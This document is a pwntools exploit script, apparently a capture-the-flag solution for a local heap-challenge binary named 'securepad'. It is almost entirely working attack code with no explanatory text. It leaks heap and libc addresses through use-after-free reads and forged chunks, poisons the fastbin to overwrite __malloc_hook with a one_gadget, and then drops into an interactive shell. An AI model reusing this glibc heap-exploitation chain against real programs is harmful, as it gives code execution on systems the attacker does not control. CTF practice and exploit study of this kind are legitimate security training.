from pwn import *

def check(pwd):
	p.sendlineafter("Enter password\n",pwd)
def add(size,c):
	p.sendlineafter(">>> ",str(1))
	check("")
	p.sendlineafter("size\n",str(size))
	p.sendafter("data",c)
def edit(idx,c):
	p.sendlineafter(">>> ",str(2))
	check("")
	p.sendlineafter("index\n",str(idx))
	p.send(c)
def free(idx):
	p.sendlineafter(">>> ",str(3))
	check("")
	p.sendlineafter("index\n",str(idx))
def show(idx):
	p.sendlineafter(">>> ",str(4))
	check("")
	p.sendlineafter("index\n",str(idx))
p=process("./securepad")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
add(0x68,"A")#0
add(0x68,"B")#1
free(1)
free(0)
add(0x68,"A")#0
#context.log_level='debug'
show(0)
data=p.readline()
heap=u64(data[:-1].ljust(8,'\x00'))-0x41
log.warning(hex(heap))
#leak over 
add(0x68,"B")#1
#clear fastbins
p.sendlineafter(">>> ",str(3))
p.sendafter("Enter password\n","A"*0x3f0+p64(heap+0x10))
p.sendlineafter("index\n",str(10))
#free #0
edit(0,p64(heap+0x70-0x10).ljust(0x58,'\x00')+p64(0x71)+p64(0x0))
add(0x68,"C")#2
add(0x68,"D")#3over lap
add(0x38,"E"*0x10+p64(0)+p64(0x21))#4 for the next_chunk's check
#fenshui over 
edit(3,p64(0)+p64(0x91))#set fake size
free(1)
#do leak libc
edit(3,"A"*0x10)
show(3)
p.readuntil("A"*0x10)
data=p.readline()
base=u64(data[:-1].ljust(8,'\0'))-(0x7ffff7dd1b78-0x00007ffff7a0d000)
log.warning(hex(base))
libc.address=base
#leak over
# fix bins
edit(3,p64(0)+p64(0x91))

free(0)
edit(2,p64(libc.symbols['__malloc_hook']-35))
add(0x68,"A")#0
one=0xf02a4+base
add(0x68,"A"*19+p64(one))#1
free(0)
free(2)
#gdb.attach(p,'b * 0xe88+0x0000555555554000')
p.interactive("nier>")

